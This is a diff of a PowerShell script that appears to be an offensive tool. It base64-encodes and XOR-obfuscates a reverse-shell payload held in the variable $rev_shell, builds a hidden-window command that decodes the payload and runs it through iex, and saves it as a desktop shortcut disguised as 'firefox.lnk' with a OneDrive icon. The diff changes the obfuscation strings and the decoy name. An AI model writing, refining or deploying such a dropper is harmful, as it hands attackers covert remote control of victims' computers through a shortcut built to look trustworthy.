@@ -13,8 +13,8 @@ $b64 = [convert]::ToBase64String([text.encoding]::ASCII.GetBytes($rev_shell))
 $strings = @("assembly",'gettype','System.Text.Encoding','System.Convert','ascii','getstring','frombase64string',$b64)
 
 #used to format after string obfuscation and fix formatting errors
-$start = "([string]::('n`ew')([char [ ]](('"
-$end = "'"+'|f`hx).("by"+"tes")|%{$johnxor-'+"$offset})))"
+$start = "([string]::nEw([char[]](('"
+$end = "'"+'|f`hx).bytes|%{$johnxor-'+"$offset})))"
 $fix = @'
 '+"'"+'
 '@
@@ -29,15 +29,16 @@ function hide{
 $strings = $strings|%{hide($_)}
 
 #decoded is [text.encoding]::ascii.getstring([type].assembly.gettype('System.Convert')::frombase64string(SomeBase64))|i`ex
-$final = ' [text.encoding]::("a`s`cii").("getstr`ing")([type].'+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|i`ex'
+$final = ' [text.encoding]::ascii.getstring([type].'+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|i`ex'
 
 #making the lnk
 $WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\outlook.lnk")
+$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\firefox.lnk")
 $Shortcut.RelativePath =  "powershell"
 $Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
 $Shortcut.TargetPath = "powershell"
 $Shortcut.Arguments = ("-WindowStyle hidden "+$final)
+$Shortcut.Arguments.Length
 $Shortcut.WindowStyle = 7
 $Shortcut.Save()
 $ErrorActionPreference='Continue'
